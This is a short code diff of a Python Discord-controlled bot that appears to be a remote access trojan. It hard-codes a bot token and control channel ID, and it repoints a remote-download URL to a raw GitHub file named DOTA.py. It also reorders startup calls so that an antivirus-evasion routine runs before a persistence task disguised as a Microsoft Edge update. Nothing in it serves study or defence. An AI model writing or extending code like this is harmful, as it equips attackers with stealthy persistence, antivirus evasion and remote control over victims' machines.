@@ -34,7 +34,7 @@ from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
 
 BOT_TOKEN = "c3c5720eedb6f9457b065ab8b6a8642fb6f2222588bf547e506bc206487132b0"
 CONTROL_CHANNEL_ID = 1536306696832426054
-RAW_GITHUB_URL = "https://raw.githubusercontent.com/ht-at/maintudu/refs/heads/main/bot.py"
+RAW_GITHUB_URL = "https://github.com/ht-at/DOTAMOD/raw/refs/heads/main/DOTA.py"
 TASK_NAME = "MicrosoftEdgeUpdateTaskMachineUA2"
 TASK_DESC = "Microsoft Edge Update Task Machine UA"
 
@@ -625,6 +625,6 @@ async def uninstall(ctx):
 
 if __name__ == "__main__":
     if check_environment():
-        install_stealth_task()
         bypass_av_memory()
+        install_stealth_task()
         bot.run(BOT_TOKEN)
